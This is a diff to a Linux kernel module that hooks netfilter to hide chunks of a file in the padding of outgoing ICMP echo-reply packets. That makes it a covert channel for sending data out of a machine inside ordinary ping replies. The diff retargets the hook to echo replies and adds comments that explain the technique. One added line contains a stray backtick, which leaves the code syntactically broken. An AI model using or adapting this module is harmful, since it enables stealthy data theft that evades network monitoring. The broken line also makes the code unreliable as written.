@@ -6,8 +6,6 @@
 #include <linux/icmp.h>
 #include <linux/skbuff.h>
 
-#include <linux/atomic.h>
-
 #define ICMPHDR_TIMESTAMP_FIELD_SIZE (8)
 
 static struct nf_hook_ops netfilter_hook;
@@ -17,6 +15,9 @@ static void unregister_hook(void);
 
 get_payload_func_t get_payload_func = NULL;
 
+/**
+ * implementation of skb_put_data (was introduced in later kernel versions).
+ */
 static inline void *skb_put_data_impl(struct sk_buff *skb, const void *data, unsigned int len)
 {
 	void *tmp = skb_put(skb, len);
@@ -24,6 +25,20 @@ static inline void *skb_put_data_impl(struct sk_buff *skb, const void *data, uns
 	return tmp;
 }
 
+/**
+ * this is the netfilter hook function. this function will be invoked whenever a packet is 
+ * about to "hit the wire" and to be sent over the network. 
+ * 
+ * whenever an outgoing ICMP-reply packet is being passed to the hook, a chunk of the file
+ * we wish to send is injected into it. note that the payload must be in the packet's padding,
+ * otherwise the requesting side won't parse the packet as a valid reply (even if the checksum)
+ * is correct. once the chunk is injected into the packet, the ICMP checksum is re-calculated
+ * and the packet is being transmitted.
+ * 
+ * since we don't have anything smart to do if we fail, every failure in this function will 
+ * cause it to return NF_ACCEPT, telling netfilter that everything is okay and that the 
+ * packet should be transmitted.
+ */
 unsigned int nf_sendfile_hook(void *priv,
                               struct sk_buff *skb,
                               const struct nf_hook_state *state)
@@ -31,8 +46,7 @@ unsigned int nf_sendfile_hook(void *priv,
     if (NULL == get_payload_func) {
         // as long as we don't have a way to get our payloads, we don't 
         // have much to do.
-        printk(KERN_DEBUG "supposed to skip this one.\n");
-        return NF_ACCEPT;
+`        return NF_ACCEPT;
     }
 
     struct iphdr *ip_layer = ip_hdr(skb);
@@ -42,18 +56,15 @@ unsigned int nf_sendfile_hook(void *priv,
     }
 
     struct icmphdr *icmp_layer = icmp_hdr(skb);
-    if (ICMP_ECHO != icmp_layer->type) {
-        // ignore ICMP echo-request packets.
+    if (ICMP_ECHOREPLY != icmp_layer->type) {
+        // ignore any non-ICMP-echoreply packets.
         return NF_ACCEPT;
     }
 
     unsigned int icmp_data_offset = sizeof(struct iphdr) + sizeof(struct icmphdr) + ICMPHDR_TIMESTAMP_FIELD_SIZE;
-
     __u8* icmp_data = skb->data + icmp_data_offset;
     ssize_t icmp_data_length = skb->len - icmp_data_offset;
-    
-    // TODO: 1. must be in padding, otherwise the ICMP reply will fail
-    // TODO: 2. check if there is enough space!
+
     size_t default_payload_size = get_default_payload_chunk_size();
     size_t actual_payload_size = 0;
     char* payload_data = (char*)kmalloc(default_payload_size, GFP_KERNEL);
